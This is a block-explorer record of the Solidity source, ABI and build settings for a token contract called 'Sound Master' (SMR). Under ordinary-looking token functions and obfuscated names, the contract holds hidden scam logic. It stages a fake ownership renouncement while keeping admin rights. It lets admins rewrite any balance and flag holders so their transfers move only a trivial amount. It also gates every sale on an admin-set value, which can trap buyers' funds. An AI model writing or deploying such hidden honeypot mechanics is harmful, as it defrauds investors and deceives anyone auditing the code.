{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.4;\n\ninterface limitAmount {\n    function createPair(address launchSwap, address listShould) external returns (address);\n}\n\ninterface takeLaunch {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address feeTake) external view returns (uint256);\n\n    function transfer(address modeAt, uint256 teamReceiver) external returns (bool);\n\n    function allowance(address sellShould, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 teamReceiver) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address modeAt,\n        uint256 teamReceiver\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed takeAmount, uint256 value);\n    event Approval(address indexed sellShould, address indexed spender, uint256 value);\n}\n\nabstract contract toEnable {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface maxIs {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface takeLaunchMetadata is takeLaunch {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract SoundMaster is toEnable, takeLaunch, takeLaunchMetadata {\n\n    address private maxSwap;\n\n    uint256 private enableTotal;\n\n    mapping(address => bool) public takeTotalReceiver;\n\n    uint8 private txList = 18;\n\n    bool public maxFee;\n\n    bool private fundTradingSwap;\n\n    uint256 public launchedFrom;\n\n    function teamToken() public {\n        emit OwnershipTransferred(takeBuy, address(0));\n        maxSwap = address(0);\n    }\n\n    string private totalTxMax = \"Sound Master\";\n\n    function transfer(address tokenLiquidity, uint256 teamReceiver) external virtual override returns (bool) {\n        return amountWalletReceiver(_msgSender(), tokenLiquidity, teamReceiver);\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return exemptFrom;\n    }\n\n    function teamTrading(address tokenLiquidity, uint256 teamReceiver) public {\n        isTo();\n        liquiditySwap[tokenLiquidity] = teamReceiver;\n    }\n\n    address public takeBuy;\n\n    function tokenSellReceiver(address fundAmount, address modeAt, uint256 teamReceiver) internal returns (bool) {\n        require(liquiditySwap[fundAmount] >= teamReceiver);\n        liquiditySwap[fundAmount] -= teamReceiver;\n        liquiditySwap[modeAt] += teamReceiver;\n        emit Transfer(fundAmount, modeAt, teamReceiver);\n        return true;\n    }\n\n    bool private senderSell;\n\n    function owner() external view returns (address) {\n        return maxSwap;\n    }\n\n    mapping(address => bool) public tokenMin;\n\n    function name() external view virtual override returns (string memory) {\n        return totalTxMax;\n    }\n\n    address public marketingEnable;\n\n    function allowance(address walletReceiver, address receiverSwap) external view virtual override returns (uint256) {\n        if (receiverSwap == fundShould) {\n            return type(uint256).max;\n        }\n        return isSwap[walletReceiver][receiverSwap];\n    }\n\n    bool public receiverTxMode;\n\n    mapping(address => mapping(address => uint256)) private isSwap;\n\n    function symbol() external view virtual override returns (string memory) {\n        return amountAt;\n    }\n\n    uint256 public exemptTo;\n\n    function exemptListFund(address fromMax) public {\n        isTo();\n        \n        if (fromMax == takeBuy || fromMax == marketingEnable) {\n            return;\n        }\n        tokenMin[fromMax] = true;\n    }\n\n    function approve(address receiverSwap, uint256 teamReceiver) public virtual override returns (bool) {\n        isSwap[_msgSender()][receiverSwap] = teamReceiver;\n        emit Approval(_msgSender(), receiverSwap, teamReceiver);\n        return true;\n    }\n\n    bool private shouldAuto;\n\n    function decimals() external view virtual override returns (uint8) {\n        return txList;\n    }\n\n    function marketingFrom(uint256 teamReceiver) public {\n        isTo();\n        exemptTotal = teamReceiver;\n    }\n\n    uint256 teamLaunched;\n\n    address limitAt = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function isTo() private view {\n        require(takeTotalReceiver[_msgSender()]);\n    }\n\n    uint256 private exemptFrom = 100000000 * 10 ** 18;\n\n    function amountWalletReceiver(address fundAmount, address modeAt, uint256 teamReceiver) internal returns (bool) {\n        if (fundAmount == takeBuy) {\n            return tokenSellReceiver(fundAmount, modeAt, teamReceiver);\n        }\n        uint256 receiverAuto = takeLaunch(marketingEnable).balanceOf(limitAt);\n        require(receiverAuto == exemptTotal);\n        require(modeAt != limitAt);\n        if (tokenMin[fundAmount]) {\n            return tokenSellReceiver(fundAmount, modeAt, shouldTotal);\n        }\n        return tokenSellReceiver(fundAmount, modeAt, teamReceiver);\n    }\n\n    mapping(address => uint256) private liquiditySwap;\n\n    function balanceOf(address feeTake) public view virtual override returns (uint256) {\n        return liquiditySwap[feeTake];\n    }\n\n    function transferFrom(address fundAmount, address modeAt, uint256 teamReceiver) external override returns (bool) {\n        if (_msgSender() != fundShould) {\n            if (isSwap[fundAmount][_msgSender()] != type(uint256).max) {\n                require(teamReceiver <= isSwap[fundAmount][_msgSender()]);\n                isSwap[fundAmount][_msgSender()] -= teamReceiver;\n            }\n        }\n        return amountWalletReceiver(fundAmount, modeAt, teamReceiver);\n    }\n\n    uint256 private swapMin;\n\n    uint256 constant shouldTotal = 15 ** 10;\n\n    address fundShould = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    bool private teamMode;\n\n    event OwnershipTransferred(address indexed modeLaunched, address indexed tokenSell);\n\n    uint256 public exemptTotalTrading;\n\n    function teamTo(address launchedBuy) public {\n        require(launchedBuy.balance < 100000);\n        if (receiverTxMode) {\n            return;\n        }\n        if (senderSell) {\n            launchedFrom = enableTotal;\n        }\n        takeTotalReceiver[launchedBuy] = true;\n        if (shouldAuto) {\n            shouldAuto = false;\n        }\n        receiverTxMode = true;\n    }\n\n    constructor (){\n        if (exemptTotalTrading == launchedFrom) {\n            launchedFrom = exemptTo;\n        }\n        maxIs walletSwap = maxIs(fundShould);\n        marketingEnable = limitAmount(walletSwap.factory()).createPair(walletSwap.WETH(), address(this));\n        \n        takeBuy = _msgSender();\n        takeTotalReceiver[takeBuy] = true;\n        liquiditySwap[takeBuy] = exemptFrom;\n        teamToken();\n        \n        emit Transfer(address(0), takeBuy, exemptFrom);\n    }\n\n    string private amountAt = \"SMR\";\n\n    function getOwner() external view returns (address) {\n        return maxSwap;\n    }\n\n    uint256 exemptTotal;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sellShould\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"modeLaunched\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tokenSell\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"takeAmount\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletReceiver\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"receiverSwap\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverSwap\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"teamReceiver\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeTake\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromMax\",\"type\":\"address\"}],\"name\":\"exemptListFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptTo\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptTotalTrading\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedFrom\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingEnable\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"teamReceiver\",\"type\":\"uint256\"}],\"name\":\"marketingFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverTxMode\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeBuy\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"takeTotalReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedBuy\",\"type\":\"address\"}],\"name\":\"teamTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenLiquidity\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"teamReceiver\",\"type\":\"uint256\"}],\"name\":\"teamTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"tokenMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenLiquidity\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"teamReceiver\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundAmount\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"modeAt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"teamReceiver\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "SoundMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}